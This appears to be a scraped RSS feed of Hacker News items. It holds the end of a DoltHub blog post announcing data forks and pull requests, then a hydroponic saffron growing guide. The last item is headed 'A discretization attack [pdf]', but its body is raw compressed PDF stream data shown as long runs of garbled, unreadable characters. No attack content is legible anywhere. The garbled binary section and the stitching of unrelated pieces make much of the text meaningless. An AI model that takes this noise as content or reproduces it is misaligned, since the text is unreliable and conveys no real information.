<p>Different moderation strategies can be employed each with their own strengths and weaknesses.  Automated moderation systems
can detect some types of data errors quickly, but they can take a lot of work to train and tune in order to have a
good hit rate for erroneous changes. User based moderation systems give control to community members, and they are easy
and low cost to deploy, but their success is highly variable depending on the abilities of the moderators.</p>
<p>GitHub and DoltHub organize their projects into repositories, and grant users different privileges.  Users
may be given write access to the project by one of its owners.  These users are trusted by the project to maintain
data quality and may make changes to the data directly. In GitHub, untrusted users may fork the data, and submit changes
back to the main dataset via a "Pull Request". <em>As of today, you can do that on DoltHub too</em> <a href="#introducing-dolthub-forks-and-cross-fork-pull-requests">(Details below)</a>. </p>
<h2>Community Disagreement and Ownership</h2>
<p>Even when you have a good moderation system, datasets evolve, and disagreements can arise.  As an example, In 2007 Open
Street Maps had an <a href="https://en.wikipedia.org/wiki/Wikipedia:Edit_warring">"edit war"</a>
over the language that should be used for locations in Turkish controlled Northern Cypress.  Wikipedia keeps a page
dedicated to the <a href="https://en.wikipedia.org/wiki/Wikipedia:Lamest_edit_wars">lamest edit wars</a> seen on their platform. Other
types of disputes could be simple disputes over schema, or formatting.</p>
<p>GitHub, and now DoltHub handle this with forks. In the event that you do not like the direction that a project is going
you can always fork the project, and take it in your own direction, and you can still continue to integrate changes
from the project that you forked from.  Additionally, you can still send PRs to get your changes pushed back onto the
project you forked from.  You can continue to collaborate with the entire community, even after you have taken your
version of the project in another direction. One major example of a successful fork is MariaDB. In 2009 MySQL was forked
after a couple of acquisitions left concerns about MySQL as an open source project. Today MariaDB is a thriving
project, with a robust community.</p>

<p>Today <a href="https://dolthub.com/">Dolthub</a> is launching forks, and it is a leap forward for collaborative data projects. This
is the first solution for open data collaboration which addresses all these problems in a generalized way.  </p>
<h2>What is a Fork</h2>
<p>A fork is a copy of the data which you become the owner of.  You control who can modify your data, and those users determine
what data gets merged.  You can continue to pull changes from the repository that you forked from, and you can submit
pull requests (PRs) back to it.  You can use it as a tool to get your changes onto a repository, or you can use it to
take that repository in a different direction.</p>
<h2>What is a Pull Request</h2>
<p>A pull request or PR is a request sent to the contributors of a repository to merge your changes into their repository. It
will encapsulate all the changes that were made between the first common ancestor of the source of your repository, and
the destination branch of the repository you are submitting to. Owners of the pull request's destination repository can
then review and integrate these changes into their repository.</p>

<p>At the end of july I wrote <a href="https://www.dolthub.com/blog/2020-07-29-scraping-linkedin/">an article about Open Resumes</a>,
where I talked about the motivations for scraping linked in, and the desire for an
<a href="https://www.dolthub.com/repositories/Liquidata/open-resumes/">Open Resumes</a> dataset. With the arrival of forks I invite
you to fork the dataset, and send us a pull request containing your scraped LinkedIn resume.  More than anything, our goal
here is to show off Dolt/DoltHub as a data collaboration platform. </p>

<p>With today's release we feel we are a step closer to being the platform that we envisioned in 2018.  We have built the most
important features of a collaborative data platform. We will continue to develop features to this end which will improve
the experience, but the next step is to get people to start collaborating on data on the platform. We are getting ready
to put our money where our mouth is.  Stay tuned for some announcements that could make you real money collaborating on
some of our datasets.</p></div></div>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-09-18-introducing-forks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521536</guid>
            <pubDate>Fri, 18 Sep 2020 20:26:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Growing Saffron Hydroponically: A Guide]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521329">thread link</a>) | @jelliclesfarm
<br/>
September 18, 2020 | https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide | <a href="https://web.archive.org/web/*/https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><img width="696" height="522" src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-300x225.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-768x576.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-80x60.jpg 80w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-265x198.jpg 265w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-560x420.jpg 560w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="Growing Saffron Hydroponically." title="Growing Saffron Hydroponically." data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20696%20522'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-300x225.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-768x576.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-80x60.jpg 80w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-265x198.jpg 265w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-560x420.jpg 560w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720.jpg 800w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg"><figcaption>Growing Saffron Hydroponically.</figcaption></figure></div>
            <!-- content --><h3><span id="A_step_by_step_guide_for_growing_hydroponic_saffron"><strong><u>A step by step guide for growing hydroponic saffron</u></strong></span>
</h3>
<p>Today, we discuss the topic of growing saffron hydroponically, hydroponic saffron plant care, hydroponic saffron bulb germination, harvesting procedure of hydroponic saffron, hydroponic nutrient solution, fertilizer for the saffron plants, and suitable hydroponic <a data-ail="1844" target="_self" href="https://gardeningtips.in/nft-hydroponics-system-building-requirements">NFT</a> (Nutrient film technique), DWC (Deepwater culture) system for growing saffron.</p>
<p>Hello, dear readers today we are back again with something more interesting and valuable for you. What if I say I have the formula to make you rich that too simply by gardening at your home only! The plant today we will be discussing is no less than a treasure, I hope all you are aware of the worldâ€™s most expensive spice!!</p>

<p>Yes, friends, we will be talking about <strong><u>how to grow saffron</u></strong> in a <a data-ail="1844" target="_self" href="https://gardeningtips.in/starting-hydroponics-gardening-at-home">hydroponics</a> system. Saffron: strands of gold a spice that costs more by weight than the gold. However, since we canâ€™t grow gold, saffron might be the next best thing.</p>
<h4><span id="Growing_saffron_bulbs_hydroponically"><strong><u>Growing saffron bulbs hydroponically</u></strong></span>
</h4>
<p>The saffron crocus (<em>Crocus sativus L.)</em> is propagated from a small rounded corm (very much similar to a bulb). Authentic Saffron spice comes from the stigma of the Saffron corm flower. The corm is basically the bulb from which the Saffron is grown it is a rounded tuber that gives rise to up to three flowers. The corms are purchased when they are in the dormant stage, and plant in late summer or early fall when they quickly burst into life with the production of small crocus flowers.</p>
<p>This exotic spice is the dried thread like red-gold colored stigma which is formed inside the beautiful blue/purple flower. Each flower produces on an average of three stigmas which give three strands of saffron. After flowering, the plant resumes its vegetative growth of thin, dark green strap-like leaves and then multiplies itself. It takes approximately a pound of fresh flowers to yield an ounce of stigmas. Once the stigmas are dried to produce the spice, it loses about 75 â€“ 80% of its mass and considerable weight leaving you with very little spice, which is one very solid reason the price is so very expensive. Furthermore, in addition to its culinary uses, Saffron has also demanded it is pharmaceutical, cosmetic, and industrial applications.</p>

<p>You may also like <a data-mil="1844" href="https://gardeningtips.in/growing-stevia-hydroponically-from-seed-a-full-guide"><span><strong>Growing Stevia Hydroponically from Seed</strong></span></a>.</p>
<p>Saffron is a tough crop to grow and maintain but far from impossible. In fact, probably <strong><u>saffron spice grown hydroponically</u></strong> is easy to grow and maintain than it would be conventional. The bulbs or corms are the propagating material and can be easily obtained from stores for <strong><u>growing saffron indoors for profit</u></strong> as well.</p>
<p>When buying corms for the first time, it is important to know that like many flowering bulbs, the corms come in different size grades from very small (0.6 grams) which would be a non-flowering type requiring an extra seasonâ€™s growth, to very large (24 grams).</p>

<p>The smaller corms are usually less expensive, but they may not produce flowers in the first season or gives a much lower yield of saffron and a lower number of daughter corms after flowering. The top planting grade for hydroponics is around 15 grams which are generally over an inch in diameter. The corms turn up dry in a dormant state ready for planting out.</p>
<p>In an indoor Hydroponic system, they can be planted throughout the year as you are determining and manipulating their growing environment affecting <strong><u>the growth of saffron</u></strong> even this is followed in the <strong><u>hydroponic flower farm</u></strong>.</p>
<p>The corms can be planted, flowered, and harvested in approximately 45-day cycles. At the completion of each cycle, you will have to start again with new corms or wait for the existing ones to go through their vegetative and dormancy phases before re-flowering and multiplying again.</p>
<h4><span id="The_dormancy_of_saffron_plants"><strong>The dormancy of saffron plants</strong></span>
</h4>
<figure id="attachment_1846" aria-describedby="caption-attachment-1846"><img src="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg" alt="Saffron Plants." width="800" height="531" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-300x199.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-768x510.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-696x462.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-633x420.jpg 633w" sizes="(max-width: 800px) 100vw, 800px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20531'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-300x199.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-768x510.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-696x462.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-633x420.jpg 633w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg"><figcaption id="caption-attachment-1846">Saffron Plants.</figcaption></figure><p>The non-productive vegetative and dormancy phase takes approximately about nine months, so starting with new corms for each growth cycle is actually the most cost-effective way.</p>
<p>You may be interested in <a data-mil="1844" href="https://gardeningtips.in/growing-hydroponic-bitter-gourd-from-seed"><span><strong>Growing Hydroponic Bitter Gourd from Seed</strong></span></a>.</p>

<p>Another option is to keep several sets of corms and their daughter corms ready; while one set is in the dormant stage the others will be producing. Dormant Corms should be stored in a dry location and planted out at the appropriate time over the winter and will sprout again in the fall. After breaking the dormancy they do need to go through their vegetative stage to gain enough energy for the production of the following seasonâ€™s crop. Each healthy parent corm produces about five to ten daughter corms that can be used to give another crop in the following season.</p>
<h4><span id="Hydroponic_setup_and_nutrient_solution_for_saffron"><strong>Hydroponic setup and nutrient solution for saffron</strong></span>
</h4>
<p>For growing saffron in hydroponics system like NFT, DWC and pin trays are commonly used. Pin trays are principally temporary growing chambers where the plantsâ€™ roots will be growing and the bulbs are anchored. These chambers provide support while the roots are developing. Loose growing media such as Perlite, vermiculite â€“ <a data-ail="1844" target="_self" href="https://gardeningtips.in/hydroponics-perlite-growing-medium-advantages">perlite</a> blend, <a data-ail="1844" target="_self" href="https://gardeningtips.in/coconut-coir-benefits-for-gardening-making-uses">coco coir</a>. Oasis starter cubes are used for starting bulbs. The Media must be loose enough to allow bulb and root expansion but powerful enough to support the full-grown flowering plants.</p>
<p>Plants that grow with Bulbs or corms; grow best with lots of phosphorus and potassium for growth and flower production. Not too much nitrogen is required. Hydroponic nutrients are not strictly necessary for germination if you choose this way; the corms/seeds should be supplied with nutrients mixed at less than half strength with water.</p>


<p>You may also like<a data-mil="1844" href="https://gardeningtips.in/growing-hydroponic-broccoli-a-complete-guide"><strong><span> Growing Hydroponic Broccoli</span></strong></a>.</p>

<p>Some of the more adventurous growers like to dive into plant chemistry and formulate their own nutrient solutions, assuming you are prepared to deal with some plant losses while experimenting.</p>
<p>In the case of Saffron, the plant does not require much attention the only thing you are interested here is germination and flowering. Once the plant has flowered rest growth it is no longer of any use, the stigmas are harvested upon bloom. So the option is nutrient solution should be the one specially designed to promote flowering /blooms. Â&nbsp;So you can fetch bloom formulation from any store just make sure you do dilution as per the manufacturerâ€™s instructions. Nutrient values should be measured at regular intervals with pH and EC meters, nutrient attributes an EC of 1.4 and pH 5.5 encourage flowering.</p>
<h4><span id="The_temperature_requirement_for_growing_saffron_hydroponically"><strong>The temperature requirement for growing saffron hydroponically</strong></span>
</h4>
<p>One of the advantages of the indoor hydroponic technique is temperature can be manipulated by the grower. A range of 60 to 65 degree Fahrenheit in daytime range, with nigh-time temperature, should not be lower than 53 Fahrenheit is best for the flowering.</p>
<p>If it gets too warm the flower will experience flower drop and in too cold conditions plant will also get flower drop followed by dormancy. So indoor grow room, should be manipulated in such a way that it provides dry warmth of summer to induce growth, followed by damp and cooler conditions to induce flowering.</p>

<p>You should not miss <a data-mil="1844" href="https://gardeningtips.in/growing-bottle-gourd-hydroponically-lauki-from-seed"><strong><span>Growing Bottle Gourd Hydroponically</span></strong></a>.</p>
<h4><span id="The_light_requirement_for_saffron_growing_hydroponically"><strong>The light requirement for saffron growing hydroponically</strong></span>
</h4>
<p>Exposure of 14 to 16 hours of direct light per day is the optimal day length to induce flowering. Post-flowering the day length can be reduced to 12 â€“ 14 hours a day. So make sure you install your hydroponic setup in the place where optimum light hours are met.</p>
<h4><span id="Flowering_and_harvesting_saffron_in_hydroponics"><strong>Flowering and harvesting saffron in hydroponics</strong></span>
</h4>
<p>The flowering of the corms will usually take place quite quickly after planting; within a few weeks, the first emerging flower buds can be seen. The flowers will completely open within three to five days and will be ready for harvest. As each flower blooms, it should be plucked or snipped from the plant and taken away for further processing.</p>
<p>Inside the flower there will be two or three thin dark red coloured thread like a stigma which are the economic part of the plant and forms the saffron spice when dried; there will also be three, shorter, wider, golden-colored anthers which usually bear pollen on their surface these are not element of the spice and should be discarded. The simplest way of removing the saffron stigmas from the center of the flower is to pull back and remove all the petals and then clip the red strands at the base. These will then require to be dried before storage.</p>
<figure id="attachment_1845" aria-describedby="caption-attachment-1845"><img src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg" alt="Dry Saffron." width="800" height="535" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-300x201.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-768x514.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-696x465.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-628x420.jpg 628w" sizes="(max-width: 800px) 100vw, 800px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20535'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-300x201.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-768x514.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-696x465.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-628x420.jpg 628w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg"><figcaption id="caption-attachment-1845">Dry Saffron.</figcaption></figure><p>Saffron is very delicate and the strands should be placed carefully on white paper and allowed to air dry and fully desiccate. Any slight breeze can easily blow not only the strands but your efforts too. Being small and very light, the saffron dries within a week in most cases and can then be stored in airtight glass jars for better storage. A small pack of silicon desiccant can be used to make ensure that any additional moisture on the strands or air does not cause any storage problems. Inadequately dried saffron invites mold, fungi, so supplementary air-drying time is recommended if the humidity levels are high.</p>
<p>Thatâ€™s all folks about growing saffron hydroponically along with its cultivation practices without <a data-ail="1844" target="_self" href="https://gardeningtips.in/preparing-soil-for-vegetable-garden-a-full-guide">soil</a>.</p>
<p>You may also check the <a href="https://www.agrifarming.in/sweet-potato-cultivation-income-profit-project-report"><span><strong>Sweet Potato Cultivation Income, Profit, Project Report</strong></span></a>.</p>

<div>
<div data-currpage="1" id="epyt_gallery_76212"><iframe id="_ytid_61147" width="696" height="392" data-origwidth="696" data-origheight="392" src="https://www.youtube.com/embed/nqikG1ByIZQ?enablejsapi=1&amp;autoplay=0&amp;cc_load_policy=0&amp;iv_load_policy=1&amp;loop=0&amp;modestbranding=0&amp;rel=0&amp;fs=0&amp;playsinline=0&amp;autohide=2&amp;theme=dark&amp;color=red&amp;controls=1&amp;" title="YouTube player" data-epytgalleryid="epyt_gallery_76212" allow="autoplay; encrypted-media" allowfullscreen="" data-no-lazy="1" data-skipgform_ajax_framebjll=""></iframe><div><div><div tabindex="0" role="button" data-videoid="nqikG1ByIZQ"><div><div data-bg="https://i.ytimg.com/vi/nqikG1ByIZQ/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Terrace Gardening Guide</p></div><div tabindex="0" role="button" data-videoid="7rWkpXcrzrg"><div><div data-bg="https://i.ytimg.com/vi/7rWkpXcrzrg/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Growing Mushrooms Indoors</p></div><div tabindex="0" role="button" data-videoid="aIs5My0dRGI"><div><div data-bg="https://i.ytimg.com/vi/aIs5My0dRGI/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>How To Make Compost</p></div><div tabindex="0" role="button" data-videoid="nL8pSWvQHHU"><div><div data-bg="https://i.ytimg.com/vi/nL8pSWvQHHU/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Growing Coriander from Seed</p></div><div tabindex="0" role="button" data-videoid="v5JeoXtqk2s"><div><div data-bg="https://i.ytimg.com/vi/v5JeoXtqk2s/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Organic Farming Basics</p></div><div tabindex="0" role="button" data-videoid="jB6rx9N5L1E"><div><div data-bg="https://i.ytimg.com/vi/jB6rx9N5L1E/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Hydroponic Farming</p></div></div></div></div></div>

<!-- AI CONTENT END 1 -->
        </div></div>]]>
            </description>
            <link>https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521329</guid>
            <pubDate>Fri, 18 Sep 2020 20:06:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A discretization attack [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 13 (<a href="https://news.ycombinator.com/item?id=24520781">thread link</a>) | @Kubuxu
<br/>
September 18, 2020 | https://cr.yp.to/papers/categories-20200918.pdf | <a href="https://web.archive.org/web/*/https://cr.yp.to/papers/categories-20200918.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div îœj="">Äûgó
†Æ~mL÷}¯î®)ç{MJÅªÚé^“2ñcéCQ®²^¥ºJŒ–É21zùíe*´Lüå&lt;«Òˆ ÎéÚ¾‘ìò�qS`w�ˆÆ¢E.œÂž=â$}Ý¤˜j´wP¨Š3ñ¨$700D‹ì)þvAæÝ”ƒG
È…q=zòwÏréŒê¬8±‘–“
'L&gt;£FÁoQ&gt;€ŽZ&amp;N/&gt;Mçžn0'YŠ²-*ˆµÅ\&lt;§Xjrâ5SÔæk‰Ââ[‰ÿ�
£N&amp;É¶6ÒJù”E%P«Öh‹êï-÷''÷îýÖž}ñ&lt;ÇcHî-‡«G¨.¹”ÇÝk_·Cì² ´å	,ßqìK½ø-)‘Ø×R¨ÂK=�AX&lt;
ûÁcÉiƒ�?nŠ×TïiämUÁ\p‘õBìå6o(æbÕ{À¹��†)O…#Äªœ“@ØÑÜàÁZà.pÅ¶²Æd÷·D\¼…uÑE5¿KÒõ4&amp;¾5
UÇCW…rË£•n:xît4ddp„ükh�,†gî-¹Fö¤Ž‰�óR9W%ùœìfwöÉ/•HI'Ð½mk4šˆ°”ˆÀi|lÑMG¸ò.9ð�†8¸ÈñBÄC8åq&lt;ËêÄ£�eÐ5-3`g1§WR&nbsp;³˜¨(H fO‚,’û¾Œo.’òcpŽáq^È¨&lt;ˆ)Í»È$Ñ*Å…k#`XCX(„¦\l{ýã“ Fß9	
?ëÝTD·î(®*ÈM\Š•ª¹T Q2@ødOñ'RE‘j
Ür‰ˆ(vù·&amp;$„pç'®üŸ7EÆ¬‰ö¤�¥~‡¡š#8Y*4ÿ²ðÍð'2&gt;…
!ÙëÒ‘(WX›áƒ´ýIÒ¤Ë_P�k
˜þ‘­N?:¿.«:•0Ó¸Ãô5V/£îë^ù¿äžLÃ
endstream
endobj
49 0 obj
&lt;&lt;
/Length 2629      
/Filter /FlateDecode
&gt;&gt;
stream
xÚµÙ’Û¸ñÝ_1•—PU#š÷á—­Äkg7©rycm^â&lt;`HHbL‰Zgüõé&lt;4œqì$5UÃFh4}+ô£›þBùV§ÁÍ€?½øãîÅË·qpSøe–%7»ýMTæç7YœûY^Þìê›¿{Ølã$öêÆT½¶Í—Mè)ÛtgF+kUµ‰JïŒÃ&lt;öâÍ?vÏxù¶¸)�f”!ým~Ä¤~D|ÀOÝ&amp;*¼Ï›(÷ô=‚º¿biêÙ£î5‚™Ww›-Nž;ËKÔåÂªçÛñÄ£yéõ}Ó
†§ÚÆê^ÙÁÑf
]sÆÃms&gt;ð²n°Bò¨Fn¯ñ†p»múešñ%.=3Xiƒ§”¥×íñ˜î´Ù†pÈ­gâ0[õÛ™cõI6TêÌÀÄ:lç `DÖxøË·I6kg~Ï0+ú^¡$,¼fÏ_�#'Ý7–ÁNæô&amp;Æª#]jëHñÝR&amp;8çåPxGE¢Ì�Õ4dx&amp;NU8èú~œ¨lûÀ‹•1 BÊ5æÊæ‰ŸF…»…Ï…Yìy¸dè×s­{cÕ¹fy‚tèŠq4Ê« …„�&lt;®1Í]ß�ÁQ-˜ëõoCÓ;¼±Cý dG6ÇW¼ÀóÐ{æ+ô“4_²5×Í#õvÇé&amp;&nbsp;d
9ïy¼—µƒ¡“a-›T
u¡ã@ep{8NÍOpÛ&gt;7&nbsp;•D’™Ô¾k[6*¾&nbsp;HFŸAïÛ…ú
ëæ¨ÄŽ^]Ùo˜ÌÞ(óË&lt;��€‰Dñ?aþŒÉ#»7Ý±Ð#ô¸ß&nbsp;÷l�ˆXjbàÖîU+«ÐÌñ;Ú
m%©éÚçáëîlšš¼I”$žöþ­ì&gt;ê5)´&nbsp;<m¥·wÊ€¡�?@dÄû»0ôÌpwj@™€4 ß¾Î²'â¥ä�p="�ï~þ°ã©÷º�Ýþ2(ö:Ãi�¡×$‹C¯.G\…vÇÞÔ|Õ×ÍçˆùU\Ô?ueó1H<òý/¯" ýçvËï´8ü[^ö="" Û(beËq¸àÞÃ0fñÇè8¦kà�Ü®w½:i‹ÖÂ«¬yÅ <#‚$ómÄƒ¿<Ü9[‘äâ|v¡óË$sw™owºoÃè±�jr?ˆÇkÃ+¬�Š€t.håyñ­ä›i…a”¬ËgÆ@<izŸ�m«%…ƒw»¿¢,~—%~‘gß&®À��’ãÎ¶Ži‘åcæòÜ�Ëè+7Ša¹b1Ëóÿ‚bqe1="" Ê¬ˆÂï£¦ùe\.#?qî�Éƒ²iî§Ó#?o‚yî'eþý6(Þ5É¯�Èatü1Íš‹!°}s½b´3&ÀwÍxý="" ;íðyjfÝ017m˜Ódü¾Œæ„åø„Î]ú)Š�ðÕ="" Úayò¾€"’0ûq="" wg�nßicl³-«ÿ«—Û¹¤!b¦Á–="" uŒqü1º0Éw="" k(ýc¡ƒÛ_1^d�›^w½Þ~øÛûm‘x="">£&amp;™ãh&amp;s&gt;Ä2
`´[þ?”¹&amp;n`›.”»øsý‰èÔ.ûïË@»’È£L�Ùj9YO°<qvñü2›7·< “b€ iˆºð_rˆž— í="" ¶,ôÙ­liüükÌž2óaŽr×ÓËz="" §Ç»e%oüzÞ«="" xt×Æ¼{‹)¶{,”cÇ#Å¦lvl³ý2Î%³k�Äñy“2�Üuîy”pdf¢Ž£z[Õ´2e‘¼”ô�vË¤v—[&uì�íÏb—o\="">"#éÚÐe¼,×C×"žÝˆ“afWu]�¦%Eh‘¢Ã‚Ÿ”„&nbsp;¨‰+„ÜÇ0N¸&amp;&amp;ïƒÎçB�’Ü!xæ•SEò;W«P=	Ð¡á‚×ðÊ'ÒÒYIã¸‹QœÝª»V3F„&amp;Õt!+Cy|»jÁh©ƒ1ÉC¡Â4—r_-Ë�B,mã�Ò�ÍÝ¦ˆñâq–yMÛÆöL3Ë�«È²&amp;oyÉ—âªˆqP·=êbÏÏÊ1BŸÔYîPóº3Lìå1”o÷k…û˜mã"b¾îGáfJ+oAþ!.ÂÃ0ˆyòŠá‚ÃÌ/†ñ’aXGÃÄÈp~Í°ˆ™ÃG,Æ]ÉçáÄ'þXÅºdx¨øs×wªvTÚŽÝÎ'Ybe'W3Ñ¼1Á•Ñ…•³2�Ãƒ¬GE«Gb+7³cH¼U­÷úlÄ×±:&nbsp;€gí[«Àßu¨pQT’�a±z‹½
Dý8`ôCèÍkž™´Ão“ýSÇ(bË¹êÒYŠüˆšjPÌû¸ÌªþÅ‹ÿtÛ@PÍüìï³2Œ¹Ús¯;U„�G‰JVM�$,œ&amp;a¤sÇ3¦ÍçtØ‹[³
jZN�¼‚:yÎh‚@‚,1ÍéÒ6•‹§à1d…xX2�68£ŒNZ&amp;ÅwÎMÁü²=pëˆ¸(»ÖíÐ”DØt£PÛAÕÏcŒZøåD!*Ém¾¶|‘$ f±Íé&gt;Â³”­’ñÃ™LA{ìÌj$`¢†{SÇÉµI“Š»¢SZBÉ²3°tÐçŠžó„1?�õ¸®Z�½ÈŸ…è©9PBb—ÑÔ
„ú¸¶Y/î	û&amp;ã*s¯E'Áþ™è.N±yJÌ«Ì=ñ¿&lt;§çfx6³W&lt;ÙìùYdƒðRZ|B+{�‚q�ž¯¥xÆ1POÛŸ¾dúH%R$š_½å)4Eê7ã€[B²iüÙ&amp;;{Q¡À© BcJ…‘g:ñõˆàš�ØŽ|	ÈÀðwßcú„PÕõ½–¦.
)°q’@ÊÄ»X½î&lt;µ;Êš“âb¢¸ÊøG4"Ú3ß°â‹(_Í]Ã&gt;ÉAó-cx´H™ÆHµ*]Sœ{,iÄZÎæœböÕÎ)ïÍ¥ƒß£8C¦rt¼‘Ã^ù"AˆËÑ�—R«aäéû†}w‰?NÜ2äzÂõPÁ+ÒÕ–qé\8Rì›OòP˜ÃƒÅPÏ‚
É£¡…c(f'²Âî”T@øˆ¤,9KÍ±˜ŒŸ×äYÊ„oXŽµ
0e$í„IJŒ`²»3ºç¨Â	°Ät'Áñ�.ÉŒ@ÆM»LºJê,ogùÔ“!rí
RéúP²Òã&nbsp;aÕªæ4NÕš!0MFÀÆ˜Ñí,Ý`Ü½høÓ½ƒ|ÞÏ¤1K7ŽéÝ³ïRô.XV±
»B0(ŠBîÁÅf1Y/,á+Ý2ÎèÔQí	r6ÙÞJ»ãyá¢
×ZúIeÅd÷ªâÔ&gt;¤ŸøðËÌeá‚¹,™�™óyð“ówD¤©ñfXí‘\GÕA”}‚ä&lt;øÑQQç¯dþ!þÙ&gt;H�?ãï¦Ò«§©YðÂ1ÕÏI¸t0€ç; 4«³atRŸ¤ñ¹Ÿ$�…õ”aºØâ×Í7ö·í�u;Ž]wì¹®{ü¡©^¶}fÖ�xé²éã¾ov/þ
¬&lt;þe
endstream
endobj
79 0 obj
&lt;&lt;
/Length 3415      
/Filter /FlateDecode
&gt;&gt;
stream
xÚ­koãÆñ»…�&nbsp;ˆH{Ü_WäÃ]’K´A{ç´.÷�’ÖkŠTHÊŽúë;/R$M_ê´0`ÎÎwgggçEieüiynWÁâ€ï¯ÞÞ\½zgƒE¢Ò(r‹›ÛE+
PdcÅéâf·ø¸t×k«c³ü6+s_ÀÀÙå
ŸfùÖ×eÓú¼¼þtóC?ï«w&amp;]h­Ò048k°X›P¥�á	ÍõZk.ßÀq¸ÜV‡cVçMUòøëOEÖú#ÚŠŸ·ÙµÕËüWÕŒúñæýµ5ËŸpùWï’E
;1Q·¦U©Ö¼æ›$7Q´ÌËÛª&gt;dmŽË™(Ú}Þ0Ôøí…¼�G¼ôEu
